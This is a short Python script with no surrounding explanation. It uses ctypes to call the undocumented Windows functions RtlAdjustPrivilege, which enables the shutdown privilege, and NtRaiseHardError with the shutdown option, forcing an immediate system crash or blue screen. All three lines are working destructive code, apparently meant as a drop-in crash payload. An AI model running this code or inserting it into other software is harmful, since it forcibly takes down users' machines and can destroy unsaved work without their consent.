from ctypes import cdll,byref,c_bool,c_char_p
cdll.ntdll.RtlAdjustPrivilege(19, byref(c_bool(1)), byref(c_bool(0)), byref(c_bool(0)))
cdll.ntdll.NtRaiseHardError(0xC0000215, 0, 0, 0, 6, byref(c_char_p(0)))
